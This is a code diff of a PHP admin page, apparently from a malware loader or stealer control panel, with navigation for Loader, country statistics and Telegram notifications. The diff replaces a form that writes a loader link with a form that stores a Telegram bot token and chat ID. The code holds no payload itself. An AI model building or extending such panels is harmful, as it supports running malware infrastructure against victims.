@@ -24,9 +24,9 @@
                 <div class="navbar-header">
                 </div>
                 <ul class="nav navbar-nav">
+                    <li><a href="loader.php" style="color: black">Loader</a></li>
                 <li><a href="Table.php" style="color: black">Panel</a></li>
                     <li><a href="Countries.php" style="color: black">Statistic</a></li>
-                    <li><a href="telegram.php" style="color: black">Telegram Notifications</a></li>
 				<li><a href="logout.php" style="color: black">Logout</a></li>                
                 </ul>
             </div>
@@ -34,19 +34,23 @@
 		
         <div style="width:25%; margin: 0 auto;">
             <div class="well" style="opacity: 0.9; text-align:center;">
-            <h4>Change link</h4>
-			<?php
-					echo file_get_contents("loader.txt");
-			?>
+                <?php
+                $check = mysqli_query($mysqli, "SELECT * FROM `telegram`");
+                if(mysqli_num_rows($check) > 0)
+                {
+                    echo "Telegram bot added!";
+                }
+                ?>
+            <h4>Add telegram bot</h4>
                 <form method="POST" action="">
-				
                     <div class="form-group">
                     	<form method="POST" action="">
-						<input name="writing" type="text">
+						<input name="token" value="token" type="text">
+                            <input name="chatid" value="chat_id" type="text">
                     </div>					                     				
-				<input type="submit" class="btn btn-primary" name="send" value="Change">
+				<input type="submit" class="btn btn-primary" name="send" value="Add">
+                    <input type="submit" class="btn btn-primary" name="del" value="Delete">
                 </form>
-				
 				
             </div>					
          
@@ -54,25 +58,30 @@
 </html>
 
 <?php
-
-    function refresh()
-    {
-        ?>
-        <script>
-            document.location.href = "/loader.php";
-        </script>
-        <?php
-    } 
+function refresh()
+{
     ?>
-<?php
-	
-	if(isset($_POST['send']))
-	{
-		
-		$f = fopen("loader.txt","w");	
-		fwrite($f, $_POST['writing']);	
-		fclose($f);
-                refresh();
-	}
+    <script>
+        document.location.href = "/telegram.php";
+    </script>
+    <?php
+}
 
+
+if(isset($_POST['send']))
+{
+    $check = mysqli_query($mysqli, "SELECT * FROM `telegram` WHERE `token` != null ");
+    if (mysqli_num_rows($check) > 0) {
+        exit();
+    }
+    mysqli_query($mysqli, "INSERT INTO `telegram` SET `token`='" . mysqli_real_escape_string($mysqli, $_POST['token']) . "', `chatid`='" . mysqli_real_escape_string($mysqli, $_POST['chatid']) . "'");
+    refresh();
+}
+
+if(isset($_POST['del']))
+{
+    mysqli_query($mysqli, "DELETE FROM `telegram`");
+    refresh();
+}
+// $_POST['token']
 ?>
